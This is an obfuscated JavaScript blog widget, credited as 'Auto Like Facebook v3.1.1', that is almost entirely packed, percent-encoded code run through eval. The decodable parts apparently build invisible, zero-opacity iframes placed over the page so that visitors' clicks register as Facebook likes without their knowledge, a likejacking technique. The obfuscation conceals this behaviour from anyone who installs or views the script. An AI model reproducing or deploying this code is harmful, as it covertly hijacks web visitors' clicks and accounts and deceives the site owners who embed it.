d%d%4%n%l%9%9%2%D%V%P%U%T%4%s%4%i%3%F%I%o%u%4%J%4%i%x%9%c%a%l%6%9%4%k%f%x%E%H%e%L%3%a%a%D%d%4%K%4%F%l%9%7%6%F%n%y%2%a%P%l%k%2%6%x%a%e%D%q%l%o%6%10%4%L%3%a%a%D%d%u%4%J%4%i%x%9%c%a%l%6%9%4%h%3%I%G%p%e%d%4%K%4%p%g%D%4%y%f%z%o%a%4%s%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%y%11%z%P%g%E%18%g%k%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%c%0%1%r%0%1%3%0%1%f%0%1%c%0%3%3%j%d%d%d%u%4%p%g%D%4%G%8%F%2%c%4%s%4%i%g%h%y%2%u%4%i%6%D%4%e%p%g%D%4%l%4%s%4%m%u%4%l%4%12%4%y%f%z%o%a%n%h%2%9%E%a%L%u%4%l%M%M%d%4%K%4%p%g%D%4%g%r%E%F%x%4%s%4%y%f%z%o%a%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%8%0%1%c%0%1%r%0%5%8%0%5%8%0%3%3%j%d%d%d%u%4%l%i%4%e%g%r%E%F%x%4%X%s%s%4%9%x%h%h%4%Z%Z%4%g%r%E%F%x%n%l%9%7%2%I%14%i%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%3%m%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%b%c%0%1%r%0%5%3%0%1%5%0%1%f%0%3%m%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%b%8%0%1%i%0%1%2%0%1%1%0%1%q%0%5%3%0%1%7%0%3%3%j%d%d%d%4%15%s%4%m%d%4%K%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%f%5%0%1%r%0%5%3%0%1%2%0%1%q%0%1%2%0%1%5%0%3%m%0%1%1%0%5%3%0%1%i%0%1%7%0%3%m%0%b%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%3%j%d%d%d%u%4%G%8%F%2%c%4%s%4%a%D%x%2%u%4%J%4%J%4%l%i%4%e%X%G%8%F%2%c%d%4%k%f%x%E%H%e%3%r%1%m%d%u%4%J%4%i%x%9%c%a%l%6%9%4%H%w%c%E%a%e%L%3%a%a%D%d%4%K%4%F%l%9%7%6%F%n%y%2%a%P%l%k%2%6%x%a%e%h%3%I%G%p%10%4%L%3%a%a%D%d%u%4%J%4%i%x%9%c%a%l%6%9%4%D%q%l%o%6%e%d%4%K%4%l%i%4%e%G%b%y%l%p%4%12%4%a%r%i%o%h%n%h%2%9%E%a%L%d%4%K%4%t%1%y%L%9%e%G%b%y%l%p%d%u%4%H%w%c%E%a%e%5%m%m%d%u%4%G%b%y%l%p%M%M%u%4%J%4%2%h%y%2%4%K%4%F%l%9%7%6%F%n%h%6%c%g%a%l%6%9%n%L%D%2%i%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%3%j%d%d%u%4%J%4%J%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%b%r%0%5%f%0%5%b%0%1%i%0%3%m%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%1%q%0%5%8%0%3%m%0%5%8%0%5%b%0%1%r%0%5%3%0%5%b%0%1%f%0%1%b%0%3%5%j%d%d%d%u%4%D%q%l%o%6%e%d%u%4%J%u%4%J%4\'));16(17(\'%t%6%7%z%4%s%4%7%6%c%x%k%2%9%a%n%t%6%7%z%u%4%l%i%4%e%t%6%7%z%4%X%s%s%4%9%x%h%h%d%4%K%4%i%w%z%N%g%4%s%4%7%6%c%x%k%2%9%a%n%c%D%2%g%a%2%W%h%2%k%2%9%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%8%w%0%5%q%0%5%g%0%1%r%0%3%3%j%d%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%o%6%y%l%a%l%6%9%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%q%0%5%w%0%1%f%0%1%b%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%7%l%y%o%h%g%z%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%3%0%1%c%0%1%i%0%1%8%0%1%t%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%F%l%7%a%L%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%8%8%0%8%m%0%5%m%0%5%w%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%6%o%g%c%l%a%z%4%s%4%m%n%q%m%u%4%i%w%z%N%g%n%y%a%z%h%2%n%t%6%a%a%6%k%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%5%0%8%r%0%5%m%0%5%w%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%h%2%i%a%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%t%g%c%R%E%D%6%x%9%7%v%6%h%6%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%8%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%t%6%D%7%2%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%5%m%0%5%w%0%3%m%0%5%8%0%1%i%0%1%c%0%1%q%0%1%b%0%3%m%0%3%8%0%b%b%0%b%1%0%b%f%0%8%m%0%b%f%0%8%b%0%3%3%j%d%d%u%4%i%w%z%N%g%n%y%a%z%h%2%n%o%g%7%7%l%9%E%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%8%0%5%m%0%5%w%0%3%3%j%d%d%u%4%i%w%z%N%g%n%l%9%9%2%D%V%P%U%T%s%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%3%m%0%1%w%0%5%3%0%1%f%0%1%1%0%8%7%0%3%5%0%1%w%0%5%b%0%5%b%0%5%m%0%8%g%0%3%i%0%3%i%0%5%5%0%5%5%0%5%5%0%3%2%0%1%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%2%0%1%8%0%1%i%0%1%7%0%3%i%0%1%q%0%1%8%0%1%w%0%1%r%0%1%2%0%1%b%0%1%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%5%0%3%m%0%1%i%0%1%2%0%1%8%0%1%c%0%1%q%0%1%8%0%1%t%0%8%7%0%3%5%0%1%1%0%1%i%0%1%c%0%1%c%0%1%i%0%5%5%0%3%w%0%3%q%0%3%5%0%3%m%0%5%b%0%1%q%0%5%b%0%1%c%0%1%f%0%8%7%0%3%5%0%b%1%0%1%i%0%1%c%0%1%c%0%1%i%0%5%5%0%3%m%0%b%q%0%1%8%0%1%w%0%1%r%0%1%2%0%1%b%0%3%m%0%b%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%m%0%1%r%0%5%b%0%3%m%0%b%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%m%0%1%r%0%1%2%0%1%b%0%3%m%0%f%b%0%5%5%0%1%q%0%5%b%0%5%b%0%1%f%0%5%3%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%m%0%1%q%0%b%8%0%1%w%0%1%r%0%b%2%0%b%b%0%1%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%t%6%7%z%n%g%o%o%2%9%7%v%L%l%h%7%e%i%w%z%N%g%d%u%4%x%9%y%g%i%2%13%l%9%7%6%F%n%i%6%h%h%6%F%s%i%x%9%c%a%l%6%9%e%d%4%K%4%F%l%9%7%6%F%n%6%o%2%9%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%w%0%5%b%0%5%b%0%5%m%0%5%8%0%8%g%0%3%i%0%3%i%0%5%b%0%5%5%0%1%q%0%5%b%0%5%b%0%1%f%0%5%3%0%3%2%0%1%8%0%1%i%0%1%7%0%3%i%0%1%q%0%b%8%0%1%w%0%1%r%0%b%2%0%b%b%0%1%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%3%j%d%d%10%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%m%0%1%8%0%3%m%0%b%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%3%j%d%d%d%u%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%11%z%A%7%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%b%0%1%5%0%5%b%0%f%i%0%3%3%j%d%d%M%l%7%d%n%y%x%t%k%l%a%e%d%u%4%J%u%4%J%4\'));16(17(\'%t%6%7%z%4%s%4%7%6%c%x%k%2%9%a%n%t%6%7%z%u%4%l%i%4%e%t%6%7%z%4%X%s%s%4%9%x%h%h%d%4%K%4%6%5%c%l%l%4%s%4%7%6%c%x%k%2%9%a%n%c%D%2%g%a%2%W%h%2%k%2%9%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%i%0%8%5%0%1%8%0%1%q%0%1%q%0%3%3%j%d%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%o%6%y%l%a%l%6%9%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%q%0%5%w%0%1%f%0%1%b%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%7%l%y%o%h%g%z%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%3%0%1%c%0%1%i%0%1%8%0%1%t%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%F%l%7%a%L%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%8%8%0%8%m%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%6%o%g%c%l%a%z%4%s%4%m%n%q%m%u%4%6%5%c%l%l%n%y%a%z%h%2%n%t%6%a%a%6%k%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%b%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%h%2%i%a%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%t%g%c%R%E%D%6%x%9%7%v%6%h%6%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%8%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%t%6%D%7%2%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%5%m%0%5%w%0%3%m%0%5%8%0%1%i%0%1%c%0%1%q%0%1%b%0%3%m%0%3%8%0%b%b%0%b%1%0%b%f%0%8%m%0%b%f%0%8%b%0%3%3%j%d%d%u%4%6%5%c%l%l%n%y%a%z%h%2%n%o%g%7%7%l%9%E%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%8%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%5%c%l%l%n%l%9%9%2%D%V%P%U%T%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%b%f%0%8%8%0%8%m%0%8%f%0%8%m%0%8%f%0%3%5%0%3%m%0%1%i%0%1%2%0%1%8%0%1%c%0%1%q%0%1%8%0%1%t%0%8%7%0%3%5%0%b%b%0%1%i%0%1%2%0%1%r%0%5%8%0%1%q%0%b%t%0%1%8%0%b%t%0%3%w%0%3%q%0%3%5%0%3%m%0%5%b%0%1%q%0%5%b%0%1%c%0%1%f%0%8%7%0%3%5%0%b%b%0%1%i%0%1%2%0%1%r%0%5%8%0%1%q%0%3%m%0%b%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%m%0%1%8%0%3%m%0%b%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%1%3%0%1%c%0%1%q%0%1%2%0%1%t%0%8%2%0%b%b%0%3%m%0%b%i%0%3%m%0%b%2%0%3%m%0%b%r%0%3%m%0%f%b%0%3%m%0%b%f%0%8%c%0%3%i%0%1%3%0%1%c%0%1%q%0%1%2%0%1%t%0%8%2%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%t%6%7%z%n%g%o%o%2%9%7%v%L%l%h%7%e%6%5%c%l%l%d%u%4%x%9%y%g%i%2%13%l%9%7%6%F%n%1a%6%9%g%y%l%19%c%19%s%i%x%9%c%a%l%6%9%e%d%4%K%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%b%3%0%5%q%0%3%m%0%1%7%0%1%r%0%1%t%0%1%q%0%1%2%0%1%5%0%3%m%0%1%r%0%3%m%0%1%b%0%1%i%0%1%2%0%1%r%0%5%b%0%1%q%0%1%i%0%1%2%0%3%m%0%1%7%0%1%f%0%1%r%0%1%2%0%5%8%0%3%m%0%5%q%0%1%i%0%5%f%0%3%m%0%1%8%0%1%r%0%5%3%0%1%f%0%3%m%0%1%r%0%1%3%0%1%i%0%5%f%0%5%b%0%3%m%0%5%b%0%1%w%0%1%f%0%3%m%0%1%b%0%1%f%0%5%1%0%1%f%0%1%c%0%1%i%0%5%m%0%1%7%0%1%f%0%1%2%0%5%b%0%3%m%0%b%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%m%0%1%8%0%3%m%0%b%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%2%0%3%m%0%f%c%0%1%2%0%f%m%0%5%3%0%1%f%0%5%8%0%5%8%0%3%m%0%b%f%0%1%2%0%5%b%0%1%f%0%5%3%0%3%m%0%5%b%0%1%i%0%3%m%0%1%8%0%1%i%0%1%2%0%5%b%0%1%q%0%1%2%0%5%f%0%1%f%0%3%5%j%d%d%d%u%4%F%l%9%7%6%F%n%6%o%2%9%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%w%0%5%b%0%5%b%0%5%m%0%8%g%0%3%i%0%3%i%0%5%5%0%5%5%0%5%5%0%3%2%0%1%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%2%0%1%8%0%1%i%0%1%7%0%3%i%0%1%b%0%1%i%0%1%2%0%1%r%0%5%8%0%1%q%0%3%3%j%d%d%10%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%m%0%1%8%0%3%m%0%b%t%0%5%f%0%5%8%0%5%f%0%1%7%0%1%r%0%3%3%j%d%d%d%u%4%J%u%4%J%4\'));16(17(\'%t%6%7%z%4%s%4%7%6%c%x%k%2%9%a%n%t%6%7%z%u%4%l%i%4%e%t%6%7%z%4%X%s%s%4%9%x%h%h%d%4%K%4%y%8%a%9%k%4%s%4%7%6%c%x%k%2%9%a%n%c%D%2%g%a%2%W%h%2%k%2%9%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%8%0%8%8%0%5%b%0%1%2%0%1%7%0%3%3%j%d%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%o%6%y%l%a%l%6%9%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%q%0%5%w%0%1%f%0%1%b%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%7%l%y%o%h%g%z%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%3%0%1%c%0%1%i%0%1%8%0%1%t%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%F%l%7%a%L%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%8%8%0%8%m%0%5%m%0%5%w%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%6%o%g%c%l%a%z%4%s%4%m%n%q%m%u%4%y%8%a%9%k%n%y%a%z%h%2%n%t%6%a%a%6%k%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%3%0%8%f%0%5%m%0%5%w%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%h%2%i%a%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%t%g%c%R%E%D%6%x%9%7%v%6%h%6%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%8%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%t%6%D%7%2%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%5%m%0%5%w%0%3%m%0%5%8%0%1%i%0%1%c%0%1%q%0%1%b%0%3%m%0%3%8%0%b%b%0%b%1%0%b%f%0%8%m%0%b%f%0%8%b%0%3%3%j%d%d%u%4%y%8%a%9%k%n%y%a%z%h%2%n%o%g%7%7%l%9%E%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%8%0%5%m%0%5%w%0%3%3%j%d%d%u%4%y%8%a%9%k%n%l%9%9%2%D%V%P%U%T%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%3%m%0%1%i%0%1%2%0%1%8%0%1%c%0%1%q%0%1%8%0%1%t%0%8%7%0%3%5%0%f%f%0%5%m%0%1%b%0%1%r%0%5%b%0%1%f%0%f%1%0%1%f%0%5%3%0%5%8%0%1%q%0%1%i%0%1%2%0%3%w%0%3%q%0%3%5%0%3%m%0%5%b%0%1%q%0%5%b%0%1%c%0%1%f%0%8%7%0%3%5%0%1%8%0%1%w%0%1%f%0%1%8%0%1%t%0%3%m%0%1%2%0%1%f%0%5%5%0%3%m%0%5%1%0%1%f%0%5%3%0%5%8%0%1%q%0%1%i%0%1%2%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%8%0%1%w%0%1%f%0%1%8%0%1%t%0%3%m%0%f%1%0%1%f%0%5%3%0%5%8%0%1%q%0%1%i%0%1%2%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%t%6%7%z%n%g%o%o%2%9%7%v%L%l%h%7%e%y%8%a%9%k%d%u%4%x%9%y%g%i%2%13%l%9%7%6%F%n%B%o%7%g%a%2%1b%2%D%y%l%6%9%s%i%x%9%c%a%l%6%9%e%d%4%K%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%f%q%0%1%i%0%5%f%0%3%m%0%1%r%0%5%3%0%1%f%0%3%m%0%5%f%0%5%8%0%1%q%0%1%2%0%1%5%0%3%m%0%b%r%0%5%f%0%5%b%0%1%i%0%3%m%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%b%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%m%0%5%1%0%8%8%0%3%2%0%8%r%0%3%2%0%8%r%0%3%m%0%f%c%0%1%2%0%f%m%0%5%3%0%1%f%0%5%8%0%5%8%0%3%m%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%3%m%0%5%b%0%1%i%0%3%m%0%5%8%0%1%f%0%1%f%0%3%m%0%5%b%0%1%w%0%1%f%0%3%m%0%5%f%0%5%m%0%1%b%0%1%r%0%5%b%0%1%f%0%5%8%0%3%2%0%3%5%j%d%d%d%u%4%F%l%9%7%6%F%n%6%o%2%9%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%w%0%5%b%0%5%b%0%5%m%0%8%g%0%3%i%0%3%i%0%5%5%0%5%5%0%5%5%0%3%2%0%1%t%0%1%r%0%1%t%0%1%q%0%5%b%0%1%f%0%1%2%0%1%5%0%3%2%0%1%8%0%1%i%0%1%7%0%3%i%0%1%r%0%5%f%0%5%b%0%1%i%0%3%7%0%1%c%0%1%q%0%1%t%0%1%f%0%3%7%0%1%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%3%j%d%d%d%u%4%J%u%4%J%4\'));',62,74,'25|36|65|32|20|37|6f|64|33|6e|74|34|63|29|28|35|61|6c|66|27|6d|69|30|2e|70|76|39|31|3d|62|3b|43|38|75|73|79|49|55|52|72|67|77|71|6a|78|7d|7b|68|2b|7a|5d|54|5b|6b|7c|4c|4d|48|45|21|41|26|2c|42|3c|57|4f|3e|eval|decodeURIComponent|4e|4b|44|56'.split('|'),0,{}))

// == Copaser Yang Baik Tidak Akan Menghapus Credit ==
// ===== Nama : Auto Like Facebook v3.1.1 ======
// ============= Author : Ichand Kusuma ==============
// ============= Site : www.kakiteng.com =============